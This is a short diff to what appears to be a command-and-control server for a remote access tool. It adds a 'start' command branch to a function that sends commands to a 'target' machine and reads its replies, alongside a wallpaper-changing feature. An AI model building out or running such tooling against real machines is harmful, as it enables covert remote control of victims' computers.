@@ -334,6 +334,8 @@ def target_communication(target, ip):
                         print("[+] Wallpaper changed")
                 else:
                     print("[-] File Not Found")
+            elif command[:5] == 'start':
+                print(target.recv(1024).decode())
                     
             else:
                 result = reliable_recv(target)
